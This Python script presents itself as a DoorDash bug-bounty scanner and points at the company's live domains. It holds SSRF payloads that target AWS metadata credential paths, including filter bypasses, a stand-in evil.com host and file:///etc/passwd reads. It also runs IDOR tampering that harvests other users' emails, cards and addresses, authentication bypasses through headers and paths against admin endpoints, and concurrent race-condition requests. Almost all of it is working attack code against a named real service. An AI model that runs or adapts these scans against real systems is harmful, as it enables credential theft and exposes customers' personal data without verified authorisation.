#!/usr/bin/env python3
"""
DoorDash Elite Bug Hunter
Hunter: shadowstep_131

Focus Areas:
- SSRF → AWS Metadata ($5,000-$12,000)
- Account Takeover ($5,000-$12,000)
- IDOR at scale ($1,000-$5,000)
- Payment Logic Flaws ($1,000-$5,000)
"""

import requests
import json
import re
import threading
import time
from urllib.parse import urljoin, urlparse
from datetime import datetime
from pathlib import Path
import warnings
warnings.filterwarnings('ignore')

class DoorDashHunter:
    """Elite DoorDash vulnerability hunter."""
    
    def __init__(self):
        self.hunter = "shadowstep_131"
        self.base_url = "https://www.doordash.com"
        self.api_base = "https://api.doordash.com"
        self.output_dir = Path(__file__).parent / "findings"
        self.output_dir.mkdir(exist_ok=True)
        
        self.session = requests.Session()
        self.session.headers.update({
            "X-Bug-Bounty": self.hunter,
            "User-Agent": f"Mozilla/5.0 (Security Research - {self.hunter})",
        })
        
        # SSRF payloads for AWS metadata
        self.ssrf_payloads = [
            # AWS IMDSv1
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://169.254.169.254/latest/user-data/",
            # IPv6 bypass
            "http://[::ffff:169.254.169.254]/latest/meta-data/",
            "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
            # DNS rebinding
            "http://169.254.169.254.xip.io/latest/meta-data/",
            "http://169.254.169.254.nip.io/latest/meta-data/",
            # URL encoding
            "http://169.254.169.254%00.evil.com/latest/meta-data/",
            # Different ports
            "http://127.0.0.1:80/",
            "http://127.0.0.1:443/",
            "http://127.0.0.1:8080/",
            "http://localhost:6379/INFO",  # Redis
            "http://localhost:11211/stats",  # Memcached
            # File read
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/environ",
        ]
        
        # Common vulnerable parameters
        self.ssrf_params = [
            "url", "uri", "path", "dest", "redirect", "return",
            "callback", "webhook", "image", "img", "src", "href",
            "link", "fetch", "proxy", "file", "load", "target",
            "pdf", "export", "download", "preview", "ref"
        ]
        
        # IDOR parameters
        self.idor_params = [
            "id", "user_id", "userId", "uid", "account_id",
            "order_id", "orderId", "oid", "address_id",
            "payment_id", "card_id", "merchant_id", "store_id",
            "dasher_id", "driver_id", "customer_id"
        ]
        
        self.findings = []
    
    def log(self, level: str, message: str):
        """Log with timestamp."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "WARNING": "\033[93m",
            "CRITICAL": "\033[91m",
            "RESET": "\033[0m"
        }
        color = colors.get(level, colors["RESET"])
        print(f"[{timestamp}] {color}[{level}]{colors['RESET']} {message}")
    
    def add_finding(self, severity: str, title: str, url: str, details: dict):
        """Add a finding to the report."""
        finding = {
            "severity": severity,
            "title": title,
            "url": url,
            "details": details,
            "timestamp": datetime.now().isoformat(),
            "hunter": self.hunter
        }
        self.findings.append(finding)
        self.log("CRITICAL" if severity == "Critical" else "SUCCESS", f"FINDING: {title}")
        
        # Save immediately
        self._save_findings()
    
    def _save_findings(self):
        """Save findings to file."""
        output_file = self.output_dir / f"findings_{datetime.now().strftime('%Y%m%d')}.json"
        with open(output_file, "w") as f:
            json.dump(self.findings, f, indent=2)
    
    # ==================== SSRF HUNTING ====================
    
    def hunt_ssrf(self, target_url: str):
        """Hunt for SSRF vulnerabilities."""
        self.log("INFO", f"SSRF Hunting: {target_url}")
        
        for param in self.ssrf_params:
            for payload in self.ssrf_payloads[:5]:  # Top 5 payloads
                test_url = f"{target_url}?{param}={payload}"
                
                try:
                    resp = self.session.get(test_url, timeout=15, verify=False, allow_redirects=False)
                    
                    # Skip Cloudflare/WAF blocked responses
                    blocked_indicators = [
                        "just a moment", "cloudflare", "captcha", 
                        "challenge", "ray id", "blocked", "forbidden"
                    ]
                    
                    is_blocked = any(bi in resp.text.lower() for bi in blocked_indicators)
                    
                    if is_blocked:
                        self.log("WARNING", f"WAF blocked: {param}={payload[:30]}...")
                        continue
                    
                    # Check for REAL AWS metadata indicators in response
                    aws_indicators = [
                        "ami-id", "instance-id", "instance-type",
                        "AccessKeyId", "SecretAccessKey", "Token",
                        "arn:aws", "ec2.internal"
                    ]
                    
                    # Must be in response body, not just the URL
                    response_lower = resp.text.lower()
                    for indicator in aws_indicators:
                        # Make sure it's in the response, not our payload
                        if indicator.lower() in response_lower and indicator.lower() not in payload.lower():
                            self.add_finding(
                                severity="Critical",
                                title="SSRF to AWS Metadata",
                                url=test_url,
                                details={
                                    "param": param,
                                    "payload": payload,
                                    "indicator": indicator,
                                    "response_snippet": resp.text[:500],
                                    "bounty_estimate": "$5,000-$12,000"
                                }
                            )
                            return  # Found critical, stop
                    
                    # Check for internal network indicators
                    internal_indicators = ["root:", "localhost", "127.0.0.1", "internal", "private"]
                    for indicator in internal_indicators:
                        if indicator in resp.text and resp.status_code == 200:
                            self.add_finding(
                                severity="High",
                                title="SSRF - Internal Resource Access",
                                url=test_url,
                                details={
                                    "param": param,
                                    "payload": payload,
                                    "indicator": indicator
                                }
                            )
                            
                except requests.exceptions.Timeout:
                    # Timeout might indicate blind SSRF
                    self.log("WARNING", f"Timeout on {param}={payload} - possible blind SSRF")
                except Exception as e:
                    pass
    
    # ==================== IDOR HUNTING ====================
    
    def hunt_idor(self, api_endpoint: str, id_value: str, alternate_id: str):
        """Hunt for IDOR vulnerabilities."""
        self.log("INFO", f"IDOR Hunting: {api_endpoint}")
        
        # Try replacing ID
        original_url = api_endpoint.replace(id_value, id_value)
        tampered_url = api_endpoint.replace(id_value, alternate_id)
        
        try:
            # Get original response
            orig_resp = self.session.get(original_url, timeout=10, verify=False)
            
            # Get tampered response
            tamp_resp = self.session.get(tampered_url, timeout=10, verify=False)
            
            # Check if we got data for different user
            if tamp_resp.status_code == 200 and len(tamp_resp.text) > 100:
                # Look for PII indicators
                pii_patterns = [
                    r'"email":\s*"[^"]+@[^"]+"',
                    r'"phone":\s*"[0-9\-\+]+"',
                    r'"address":\s*"[^"]+"',
                    r'"card":\s*"[^"]+"',
                    r'"name":\s*"[^"]+"'
                ]
                
                for pattern in pii_patterns:
                    if re.search(pattern, tamp_resp.text):
                        self.add_finding(
                            severity="High" if "email" in pattern or "card" in pattern else "Medium",
                            title="IDOR - Access to Other User's Data",
                            url=tampered_url,
                            details={
                                "original_id": id_value,
                                "accessed_id": alternate_id,
                                "data_exposed": pattern,
                                "response_snippet": tamp_resp.text[:300]
                            }
                        )
                        break
                        
        except Exception as e:
            self.log("WARNING", f"IDOR test failed: {e}")
    
    # ==================== GRAPHQL HUNTING ====================
    
    def hunt_graphql(self, graphql_url: str = None):
        """Hunt for GraphQL vulnerabilities."""
        if not graphql_url:
            graphql_url = f"{self.base_url}/graphql"
        
        self.log("INFO", f"GraphQL Hunting: {graphql_url}")
        
        # Introspection query
        introspection = {
            "query": """
            query IntrospectionQuery {
                __schema {
                    queryType { name }
                    mutationType { name }
                    types {
                        name
                        fields {
                            name
                            args { name type { name } }
                        }
                    }
                }
            }
            """
        }
        
        try:
            resp = self.session.post(
                graphql_url,
                json=introspection,
                timeout=15,
                verify=False
            )
            
            if resp.status_code == 200 and "__schema" in resp.text:
                self.add_finding(
                    severity="Medium",
                    title="GraphQL Introspection Enabled",
                    url=graphql_url,
                    details={
                        "impact": "Full schema disclosure, helps in further attacks",
                        "schema_size": len(resp.text),
                        "next_steps": "Enumerate all queries/mutations for IDOR/AuthZ bypass"
                    }
                )
                
                # Save schema for analysis
                schema_file = self.output_dir / "graphql_schema.json"
                with open(schema_file, "w") as f:
                    f.write(resp.text)
                    
        except Exception as e:
            self.log("WARNING", f"GraphQL test failed: {e}")
    
    # ==================== RACE CONDITION HUNTING ====================
    
    def hunt_race_condition(self, target_url: str, payload: dict, threads: int = 20):
        """Hunt for race conditions."""
        self.log("INFO", f"Race Condition Hunting: {target_url}")
        
        results = []
        
        def make_request():
            try:
                resp = self.session.post(target_url, json=payload, timeout=10, verify=False)
                results.append({
                    "status": resp.status_code,
                    "response": resp.text[:200]
                })
            except Exception as e:
                results.append({"error": str(e)})
        
        # Launch concurrent requests
        thread_list = [threading.Thread(target=make_request) for _ in range(threads)]
        
        for t in thread_list:
            t.start()
        
        for t in thread_list:
            t.join()
        
        # Analyze results
        success_count = sum(1 for r in results if r.get("status") == 200)
        
        if success_count > 1:
            self.add_finding(
                severity="High",
                title="Potential Race Condition",
                url=target_url,
                details={
                    "threads": threads,
                    "successful_requests": success_count,
                    "payload": payload,
                    "impact": "Possible double-spend, promo abuse, or duplicate actions"
                }
            )
    
    # ==================== AUTH BYPASS HUNTING ====================
    
    def hunt_auth_bypass(self, protected_url: str):
        """Hunt for authentication bypasses."""
        self.log("INFO", f"Auth Bypass Hunting: {protected_url}")
        
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
        ]
        
        bypass_paths = [
            protected_url + "/",
            protected_url + "//",
            protected_url + "/..",
            protected_url + ";",
            protected_url + ".json",
            protected_url.replace("/api/", "/API/"),
        ]
        
        for headers in bypass_headers:
            try:
                resp = self.session.get(
                    protected_url,
                    headers={**self.session.headers, **headers},
                    timeout=10,
                    verify=False
                )
                
                if resp.status_code == 200 and len(resp.text) > 100:
                    self.add_finding(
                        severity="High",
                        title="Authentication Bypass via Header",
                        url=protected_url,
                        details={
                            "bypass_header": headers,
                            "response_status": resp.status_code
                        }
                    )
                    
            except Exception as e:
                pass
        
        for path in bypass_paths:
            try:
                resp = self.session.get(path, timeout=10, verify=False)
                
                if resp.status_code == 200 and len(resp.text) > 100:
                    self.add_finding(
                        severity="High",
                        title="Authentication Bypass via Path Manipulation",
                        url=path,
                        details={
                            "original_url": protected_url,
                            "bypass_url": path
                        }
                    )
                    
            except Exception as e:
                pass
    
    # ==================== MAIN HUNT WORKFLOW ====================
    
    def run_full_hunt(self):
        """Run complete hunting workflow."""
        self.log("INFO", "=" * 60)
        self.log("INFO", "DOORDASH ELITE HUNTER - shadowstep_131")
        self.log("INFO", "=" * 60)
        
        # Phase 1: SSRF
        self.log("INFO", "Phase 1: SSRF Hunting")
        ssrf_targets = [
            f"{self.base_url}/api/v1/image",
            f"{self.base_url}/api/v1/proxy",
            f"{self.base_url}/api/v1/export",
            f"{self.base_url}/api/v2/merchant/logo",
        ]
        for target in ssrf_targets:
            self.hunt_ssrf(target)
        
        # Phase 2: GraphQL
        self.log("INFO", "Phase 2: GraphQL Hunting")
        self.hunt_graphql()
        
        # Phase 3: Auth Bypass
        self.log("INFO", "Phase 3: Auth Bypass Hunting")
        admin_endpoints = [
            f"{self.base_url}/admin",
            f"{self.base_url}/api/admin",
            f"{self.base_url}/internal",
        ]
        for endpoint in admin_endpoints:
            self.hunt_auth_bypass(endpoint)
        
        # Summary
        self.log("INFO", "=" * 60)
        self.log("INFO", f"HUNT COMPLETE - {len(self.findings)} findings")
        self.log("INFO", "=" * 60)
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate markdown report."""
        report_file = self.output_dir / f"DOORDASH_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        
        with open(report_file, "w") as f:
            f.write("# DoorDash Bug Bounty Report\n\n")
            f.write(f"**Hunter:** shadowstep_131\n")
            f.write(f"**Date:** {datetime.now().isoformat()}\n\n")
            
            if not self.findings:
                f.write("No findings to report.\n")
            else:
                f.write(f"## Summary: {len(self.findings)} Findings\n\n")
                
                for i, finding in enumerate(self.findings, 1):
                    f.write(f"### {i}. [{finding['severity']}] {finding['title']}\n\n")
                    f.write(f"**URL:** `{finding['url']}`\n\n")
                    f.write("**Details:**\n```json\n")
                    f.write(json.dumps(finding['details'], indent=2))
                    f.write("\n```\n\n---\n\n")
        
        self.log("SUCCESS", f"Report saved: {report_file}")


def main():
    hunter = DoorDashHunter()
    hunter.run_full_hunt()


if __name__ == "__main__":
    main()
